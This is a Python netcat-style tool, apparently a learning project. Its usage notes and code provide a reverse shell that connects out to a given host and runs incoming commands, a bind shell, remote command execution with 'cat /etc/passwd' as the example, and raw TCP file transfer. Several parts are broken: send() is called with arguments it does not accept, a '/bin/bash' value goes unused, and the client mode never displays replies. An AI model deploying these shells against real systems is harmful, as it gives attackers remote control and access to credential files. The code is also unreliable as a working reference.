'''
Requirements:
netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
netcat.py -t 192.168.1.108 -p 5555 # connect to server
'''

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

parser = argparse.ArgumentParser()
parser.add_argument('-t', nargs='?',type=str,help='host')
parser.add_argument('-p', nargs='?', type=int, help='port')
parser.add_argument('-e', nargs='?',type=str, help='excute command')
parser.add_argument('-u', nargs='?',type=str, help='upload to file')
parser.add_argument('-l', action='store_true', help='listen')
parser.add_argument('-r', action='store_true', help='reverse command shell')
parser.add_argument('-b', action='store_true', help='binding command shell')
parser.add_argument('-d', nargs='?',type=str, help='download command shell')

opt = parser.parse_args()

######### Listen and Send ############

def listen(ip,port):
    # Listening socket
    ip = str(ip)
    ip_port = (ip, port)
    # Create a server and start listening
    server = socket.socket()
    server.bind(ip_port)
    server.listen()
    print(f'[*] Listening at {ip_port}')
    s, raddr = server.accept()
    print(f'[*] Connecting with {raddr}')
    return s, raddr

def send():
    # client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # client.connect((ip,port))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    return s

########## shell, command #############
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    result = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    result = (result.decode())
    return result

def shell_cmd(s):
   while True:
      s.send(b"#> ")
      cmd = s.recv(1024).decode()
      result = execute(cmd)
      s.send(result.encode())

############### upload_download_file #################

### Act as a server, accept file from a TCP client ####
## Client side: nc 127.0.0.1 6666 < out.txt
## Server side: nc -lvnp 6666

def upload(s,raddr,file_name):
    print(f'[*] Uploading file from:{raddr}')
    buf = b''
    while True:
       data = s.recv(1024)
       if data:
          buf += data
       else:
          f = open(file_name,'wb')
          f.write(buf)
          f.close()
          print(f'[*] Finished uploading file from:{raddr}')
          break

### Act as a client, download a file from a TCP server ###
## Server side: nc -lvnp 6666 < out.txt
## Client side: nc 120.0.0.1 6666

def download(ip,port,file_name):
    client = send(ip,port)
    raddr = (ip,port)
    print(f'[*] Downloading file from:{raddr}')
    buf = b''
    while True:
       data = client.recv(1024)
       if data:
          buf += data
       else:
          f = open(file_name,'wb')
          f.write(buf)
          f.close()
          print(f'[*] Finished Downloading file from:{raddr}')
          break

################### main ##################################


if opt.r and opt.t and opt.p:      ## a reverse shell
    ip = opt.t
    port = opt.p
    cmd = '/bin/bash'
    s = send()
    shell_cmd(s)
elif opt.b and opt.t and opt.p:    ## bind shell
    ip = opt.t
    port = opt.p
    s, raddr = listen(ip, port)
    shell_cmd(s)
elif opt.u and  opt.t and opt.p:   ## upload file
    ip = opt.t
    port = opt.p
    s, raddr = listen(ip, port)
    file_name = opt.u
    upload(s,raddr,file_name)
elif opt.d and opt.t and opt.p:   ## download file
    ip = opt.t
    port = opt.p
    file_name = opt.d
    download(ip,port,file_name)
elif opt.t and opt.p:             ## connect with a TCP server
    ip = opt.t
    port = opt.p
    client = send(ip, port)
    while True:
         request = input('')
         client.send(request.encode())
         response = client.recv(1024)









'''
socket_raddr = server_listen(ip,port)

socket_raddr = list(socket_raddr)
raddr=(socket_raddr[1])

server_shell(raddr)


### shell, command,
def server_execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    result = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    result = (result.decode())
    return result




def server_listen():
    # Listening socket
    l_ip_port = ('0.0.0.0', 6666)
    # Create a server and start listening
    server = socket.socket()
    server.bind(l_ip_port)
    server.listen()
    #s, remote = server.accept()
    #print(f'[*] Connecting with {remote}')

# Function
def com():
    while True:
      s.send(b"#> ")
      cmd = s.recv(1024).decode()
      result = server_execute(cmd)
      s.send(result.encode())
     # Start receiving and sending data
def tread():
    com_thread = threading.Thread(target = com)
    com_thread.start()

### upload file

def server_upload():
    buf = b''
    s, r_ip_port = server.accept()
    print(f'[*] Uploading file from:{r_ip_port}')
    while True:
       data = s.recv(1024)
       #print(data)
       if data:
          buf += data
       else:
          print(buf)
          filename = 'upload.txt'
          f = open(filename,'wb')
          f.write(buf)
          f.close()
          break

server_upload()
'''





























